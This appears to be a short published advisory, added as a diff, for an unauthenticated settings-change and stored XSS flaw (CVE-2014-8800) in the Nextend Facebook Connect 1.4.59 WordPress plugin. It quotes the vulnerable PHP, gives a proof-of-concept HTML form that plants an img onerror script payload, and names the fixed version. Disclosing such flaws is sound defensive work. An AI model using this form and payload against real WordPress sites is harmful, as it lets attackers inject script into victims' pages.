@@ -1,0 +1,37 @@
+# Exploit Title: Nextend Facebook Connect 1.4.59 XSS
+# Date: 16-10-2014
+# Exploit Author: Kacper Szurek - http://security.szurek.pl/ http://twitter.com/KacperSzurek
+# Software Link: https://downloads.wordpress.org/plugin/nextend-facebook-connect.1.4.59.zip
+# Category: webapps
+# CVE: CVE-2014-8800
+  
+1. Description
+  
+Anyone can change plugin settings.
+
+File: nextend-facebook-connect\nextend-facebook-settings.php
+if(isset($_POST['newfb_update_options'])) {
+	if($_POST['newfb_update_options'] == 'Y') {
+		foreach($_POST AS $k => $v){
+			$_POST[$k] = stripslashes($v);
+		}
+		update_option("nextend_fb_connect", maybe_serialize($_POST));
+		$newfb_status = 'update_success';
+	}
+}
+
+http://security.szurek.pl/nextend-facebook-connect-1459-xss.html
+  
+2. Proof of Concept
+  
+<form method="post" action="http://wordpress-instalation">
+    <input type="hidden" name="newfb_update_options" value="Y">
+    XSS: <textarea name="fb_login_button" rows="10" cols="40"><img src=x onerror=alert(String.fromCharCode(88,83,83))>&lt;/textarea&gt;
+    <input type="submit" value="Hack!">
+</form>
+  
+3. Solution:
+  
+Update to version 1.5.1
+https://downloads.wordpress.org/plugin/nextend-facebook-connect.1.5.1.zip
+https://wordpress.org/plugins/nextend-facebook-connect/changelog/
